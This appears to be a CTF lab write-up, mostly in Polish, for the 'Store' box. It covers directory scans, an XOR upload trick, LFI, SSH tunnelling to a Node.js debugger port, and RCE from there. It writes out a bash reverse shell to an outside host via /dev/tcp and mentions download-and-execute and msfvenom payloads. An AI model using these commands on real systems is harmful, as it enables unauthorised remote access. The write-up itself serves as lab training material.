# Store
Linux, Hard, created by **xct**

![Uploading store_slide.png…]()


```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Node.js (Express middleware)
5001/tcp open  http    Node.js (Express middleware)
5002/tcp open  http    Node.js (Express middleware)
```
```
feroxbuster -u http://10.10.89.181:5000 -w ~/raft.txt -t 100
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.89.181:5000
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/raft.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       51w      807c http://10.10.89.181:5000/upload
200      GET        0l        0w        0c http://10.10.89.181:5000/css/styles.css
200      GET        1l       35w      589c http://10.10.89.181:5000/list
200      GET      177l     1029w    84188c http://10.10.89.181:5000/images/laptop.jpg
200      GET        7l     2122w   159515c http://10.10.89.181:5000/css/bootstrap.min.css
200      GET        1l       87w     1161c http://10.10.89.181:5000/
200      GET        1l       35w      589c http://10.10.89.181:5000/LIST
200      GET        1l       35w      589c http://10.10.89.181:5000/List
200      GET        1l       51w      807c http://10.10.89.181:5000/UPLOAD
200      GET        1l       51w      807c http://10.10.89.181:5000/UpLoad
200      GET        1l       51w      807c http://10.10.89.181:5000/Upload
301      GET       10l       16w      173c http://10.10.89.181:5000/css => http://10.10.89.181:5000/css/
301      GET       10l       16w      179c http://10.10.89.181:5000/images => http://10.10.89.181:5000/images/
301      GET       10l       16w      173c http://10.10.89.181:5000/tmp => http://10.10.89.181:5000/tmp/
[####################] - 30m  1392655/1392655 0s      found:14      errors:3995   
[####################] - 9m    348160/348160  628/s   http://10.10.89.181:5000/ 
[####################] - 19m   348160/348160  308/s   http://10.10.89.181:5000/css/ 
[####################] - 22m   348160/348160  268/s   http://10.10.89.181:5000/images/ 
[####################] - 22m   348160/348160  258/s   http://10.10.89.181:5000/tmp/                                                                                                                                                                                                                                                 
```

```
feroxbuster -u http://10.10.89.181:5001 -w ~/raft.txt -t 100                                                                                                                                                      
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.89.181:5001
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/raft.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       51w      807c http://10.10.89.181:5001/upload
200      GET        0l        0w        0c http://10.10.89.181:5001/css/styles.css
200      GET        1l       35w      589c http://10.10.89.181:5001/list
200      GET      177l     1029w    84188c http://10.10.89.181:5001/images/laptop.jpg
200      GET        1l       87w     1161c http://10.10.89.181:5001/
200      GET        7l     2122w   159515c http://10.10.89.181:5001/css/bootstrap.min.css
200      GET        1l       35w      589c http://10.10.89.181:5001/LIST
200      GET        1l       35w      589c http://10.10.89.181:5001/List
200      GET        1l       51w      807c http://10.10.89.181:5001/UPLOAD
200      GET        1l       51w      807c http://10.10.89.181:5001/UpLoad
200      GET        1l       51w      807c http://10.10.89.181:5001/Upload
301      GET       10l       16w      173c http://10.10.89.181:5001/css => http://10.10.89.181:5001/css/
301      GET       10l       16w      179c http://10.10.89.181:5001/images => http://10.10.89.181:5001/images/
301      GET       10l       16w      173c http://10.10.89.181:5001/tmp => http://10.10.89.181:5001/tmp/
[####################] - 31m  1392655/1392655 0s      found:14      errors:4249   
[####################] - 10m   348160/348160  607/s   http://10.10.89.181:5001/ 
[####################] - 20m   348160/348160  292/s   http://10.10.89.181:5001/css/ 
[####################] - 22m   348160/348160  259/s   http://10.10.89.181:5001/images/ 
[####################] - 22m   348160/348160  259/s   http://10.10.89.181:5001/tmp/   
```

```
feroxbuster -u http://10.10.89.181:5002 -w ~/raft.txt -t 100                                                                                                                                                      
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.89.181:5002
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/kali/raft.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       51w      807c http://10.10.89.181:5002/upload
200      GET        0l        0w        0c http://10.10.89.181:5002/css/styles.css
200      GET        1l       35w      589c http://10.10.89.181:5002/list
200      GET      177l     1029w    84188c http://10.10.89.181:5002/images/laptop.jpg
200      GET        1l       87w     1161c http://10.10.89.181:5002/
200      GET        7l     2122w   159515c http://10.10.89.181:5002/css/bootstrap.min.css
200      GET        1l       35w      589c http://10.10.89.181:5002/LIST
200      GET        1l       35w      589c http://10.10.89.181:5002/List
200      GET        1l       51w      807c http://10.10.89.181:5002/UPLOAD
200      GET        1l       51w      807c http://10.10.89.181:5002/UpLoad
200      GET        1l       51w      807c http://10.10.89.181:5002/Upload
301      GET       10l       16w      173c http://10.10.89.181:5002/css => http://10.10.89.181:5002/css/
301      GET       10l       16w      179c http://10.10.89.181:5002/images => http://10.10.89.181:5002/images/
301      GET       10l       16w      173c http://10.10.89.181:5002/tmp => http://10.10.89.181:5002/tmp/
[####################] - 30m  1392655/1392655 0s      found:14      errors:4279   
[####################] - 10m   348160/348160  593/s   http://10.10.89.181:5002/ 
[####################] - 21m   348160/348160  281/s   http://10.10.89.181:5002/css/ 
[####################] - 23m   348160/348160  258/s   http://10.10.89.181:5002/images/ 
[####################] - 22m   348160/348160  264/s   http://10.10.89.181:5002/tmp/                                                                                                                                                                                                                                                  
```

why 3 ports have the same app?

![{2FE9EEEB-EF73-4B78-B0CE-2DDF900553A7}](https://github.com/user-attachments/assets/61fa0291-6329-4cbe-be74-fcd849e8fc95)

![{5F421843-B30F-4C29-BDB6-7195A8BCA5AD}](https://github.com/user-attachments/assets/49761585-4297-4c0e-9949-1c83a19eb2f4)

![{DE2EB740-6AEF-4207-B7CE-C64364199AC1}](https://github.com/user-attachments/assets/84f0d973-4946-4876-8702-88d1d086ae3b)

![{76DCBA4B-E024-41C7-88A5-48413212CA22}](https://github.com/user-attachments/assets/13604470-5cc1-4c5e-bc80-9de84b891b09)

![{FFECD181-B5AC-44E4-A968-57E51A5FB3BD}](https://github.com/user-attachments/assets/d08295e6-2b9b-445f-850c-4e1f3b602a8f)

![{07A46AA5-7D8C-4C13-A568-0C1D95C456A3}](https://github.com/user-attachments/assets/56bf9f82-9abe-46f8-99d1-3b6c881487c8)

no cóż. Trochę zabawy tutaj może być.

Dobra mam coś "ciekawego"

![{444F58B5-D74E-4BAA-8EB5-8FF07CE0F3EE}](https://github.com/user-attachments/assets/cf64c545-2aaa-4e5b-9b92-c4cf88e49b8e)

wrzuciłem nowy pliczek.

![{E32775BB-8D6F-4D5E-B43C-3204DB2DF0D2}](https://github.com/user-attachments/assets/fda7539f-3cfe-42e0-b52c-8378e1965a04)

noi i mamy go klasycznie tutaj

![{C3DC78AB-9309-4912-942C-5CCA287094E0}](https://github.com/user-attachments/assets/5b4e5683-2177-435e-b101-28536fb1f794)

ale mam też jego wariację w /tmp. Wygląda trochę jak XOR

![{6B5361B5-3801-442E-A58F-48AC53CDC6C2}](https://github.com/user-attachments/assets/6b97a0e2-70b1-444e-96d7-9144550a0002)

wprowadziłem klucz w postaci tekstu, który przesłałem i tym samym mamy klucz używany do "szyfrowania XOR".
Na wszelki wypadek wrzuciłem plik z `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` jakby klucz okazał się dłuższy.

![{BCA2A8D9-9E6E-40B5-8523-1D422B6432B3}](https://github.com/user-attachments/assets/4ced58ce-7c0a-490b-9e0c-e1189a2b78f9)


z tego co widzę to klucz to ten SZARY tekst + na końcu z jakiegoś powodu jest dodawane X zamiast 38, ale to może jakieś dopełenienie, którego nie rozumiem w pełni.. nie jest to teraz istotne.
- lecz nic mi to nie daje na ten moment więc trzeba kopać głębiej

![{D57D16E5-702D-4207-BC63-B8346DA89339}](https://github.com/user-attachments/assets/cca6d446-dfc6-4423-9512-c4b1f7b395ab)

mamy lfi!
Tylko niewygodne do exploitacji. Trzeba by coś znaleźć co ułatwi

![{DF26EED3-F977-44A3-AAC3-196C1A82E922}](https://github.com/user-attachments/assets/14ed0670-a405-40f1-b961-2f36668a7fbe)

wygląda git

![{980B9661-CCB3-41D7-82EB-92F2C2AF192B}](https://github.com/user-attachments/assets/ab3ecbe8-546a-4701-94a9-2420c41257ac)

lekko dopracować tylko

![{5ECFF1CB-34DC-49F4-98EC-213884689FE6}](https://github.com/user-attachments/assets/49503055-f798-4d33-a95b-d50552985155)

dobra można POSTem. No to na curla przerobić i można dekodować.

![{E2B5535B-B3D3-4345-B7D7-623208C6FC52}](https://github.com/user-attachments/assets/db9243c1-d8d1-4af5-8fc4-492645a58a1b)

no i działa

![{044D5F9D-7EC6-4626-AB06-8977AF2B55D1}](https://github.com/user-attachments/assets/f63f934d-a3d6-4d90-ad4a-a9a2f93be80e)


o i wiemy już gdzie iść.

![{12F6BFDB-5FBD-419A-96C3-F3C0330A0B03}](https://github.com/user-attachments/assets/038052ab-b2b2-4166-8238-7d86486383e4)

![{CC9870E2-BDD8-431D-950E-B5575C127DC3}](https://github.com/user-attachments/assets/6c9321c3-b511-4f8f-aca8-77c4c246059f)

tak z ciekawości sprawdziłem czy jest store 2 i 1

![{2A0197AE-7509-4B3A-85F7-6A70D7139FD1}](https://github.com/user-attachments/assets/96d496fd-3d91-4aa7-9388-f9e8e0c5969a)

boooring.

![env](https://github.com/user-attachments/assets/39f2dbe0-e10a-47bb-a3a4-de1035e6f762)

o coś ciekawego. Ciekawe czy uda się pivotować z ssh czy jakieś dziwne ssrfy trzeba będzie szukac.

![{8F6EBAE6-938D-4E05-81F1-70960BE506F7}](https://github.com/user-attachments/assets/53368942-f4ed-45b0-8f3f-af70c030ddc7)

![{F85E0D9A-D168-4FBD-A03A-AE54D41FB46A}](https://github.com/user-attachments/assets/3b348218-c867-4c0a-a08c-9c19f16ebb8d)

WIDZĘ moje pliki. Czyli pewnie trzeba poszukać dodatkowej usługi
ale.. sprowadzić tą, którą już znamy na poracie 9231.

![{79CCA834-15FC-455A-A3E2-10283D0C9CC7}](https://github.com/user-attachments/assets/f387b3c6-d164-4a90-a8dc-39f49d516dd6)

![{EE940A5E-CDFF-4AC6-A742-D90170162DFF}](https://github.com/user-attachments/assets/9a842ed6-aecc-4509-bca2-843622142a78)

przy okazji są 3 różne

![{D604DC13-9B15-42A0-A449-6B7A8DBAC8C6}](https://github.com/user-attachments/assets/b3bfe181-5033-428d-8ed3-3593f6cd0692)

```
https://nodejs.org/en/learn/getting-started/debugging
https://book.hacktricks.xyz/pl/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse
https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging
```

![{F4AA0579-376D-4CE1-A43F-F6EE9B1CB0DB}](https://github.com/user-attachments/assets/5d9f57d6-5afc-45d3-99ac-a51d7aa1b1f8)

ale z tego co widzię i rozumiem to bez VScode się nie uda.

![{A532D146-5F19-4BDC-9415-70F857FE437A}](https://github.com/user-attachments/assets/c25bac02-9648-41f3-9e39-dd51759ed3a3)

- nie chce mi się bawić w jakiś zmiany proxy w vscode itd itd więc prosta zmiana w ssh
```
ssh -L 9229:127.0.0.1:9229 -N sftpuser@10.10.89.181
```


![{7665EBC3-7962-4C13-96D0-0509A6FD7182}](https://github.com/user-attachments/assets/7ddc998f-d7d2-4898-8fae-e62936e8a608)

trochę edycji i śmiga.

### Shell
Teraz wydaje mi się, że bez problemu powinniuśmy móc wykonywać komendy nodejsa więc rce od ręki.


![{0F755B84-BC93-40AD-BB5B-A8D9302B4DC0}](https://github.com/user-attachments/assets/283ff0fa-e46f-4393-8cd7-1e97f97c6cbe)

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#NodeJs


![{808FEC68-D1FA-49A8-A09C-AD79E1E2FF8E}](https://github.com/user-attachments/assets/03ea5515-1822-4215-aacd-4cd207458551)

- nie dało shella


![{A641CAED-5060-4E69-8E2D-6E27C00C4179}](https://github.com/user-attachments/assets/e3be4235-00d2-4107-bf84-5332a8e0635e)

o curl działa


![{20768FBE-F20D-4DDF-979C-4BC357D5DB3A}](https://github.com/user-attachments/assets/d980731a-ac6c-47e6-8fb1-155387be0471)

a
```
bash -c 'bash -i >& /dev/tcp/10.8.4.124/443 0>&1'
```


![{FF51AF38-CE87-4038-ACC1-1DA529A0EE59}](https://github.com/user-attachments/assets/dae10a0e-fcd7-4278-bf65-cd1f3f633466)

download and execute

![{8A38675B-8B99-4B70-8DEE-6F95B74F99A7}](https://github.com/user-attachments/assets/93c9a3b0-edf3-497b-96df-1ee8247b8dd5)

poberać klucz pryawtny, ustabilizować shella, wkleić flage.


![{D9A1882D-1289-4A87-86C0-AFE8B0CB43F7}](https://github.com/user-attachments/assets/69dae952-81b0-437b-893c-e5d3c253ed5b)

hmmmmmm


![{DD501F68-A048-4862-81D7-CF1D909DE96F}](https://github.com/user-attachments/assets/41449d62-f4d8-4d56-bb97-36f804000770)

widzimy jakiś dodatkowy port 9515


![{2AE338CB-9E6D-4933-B909-E4AAB40891ED}](https://github.com/user-attachments/assets/ac5ac5c1-a00c-435e-b942-27e2936ed4a0)

wygląda jakby to mogło być powiazane.

Do finalnej exploitacji potrzebujemy shella w elfie więc najprościej msfvenom


![{2AC008BE-BF27-4D21-838C-239DABFE77C5}](https://github.com/user-attachments/assets/41000af6-acb8-4ee2-b3bd-dc2966f1d881)


![{CBB3BC70-7D60-4D1E-AE3F-2EA65E0C7EFE}](https://github.com/user-attachments/assets/98970fa7-60ad-4bb8-9b37-b1717febec50)


![{B7D1B898-97E0-48DD-B09A-8640E8002806}](https://github.com/user-attachments/assets/a8b6c431-b771-4082-b57a-c69b72f7894c)


![{270FE613-330D-47E3-B197-2CFC1C46361F}](https://github.com/user-attachments/assets/06e7155b-5477-4220-b319-08f42d138390)


![{59070B59-B310-4A8B-8337-8E4547D6F784}](https://github.com/user-attachments/assets/8cf6a307-443e-4c3f-ad2a-2ba8e6684c12)


FINISH

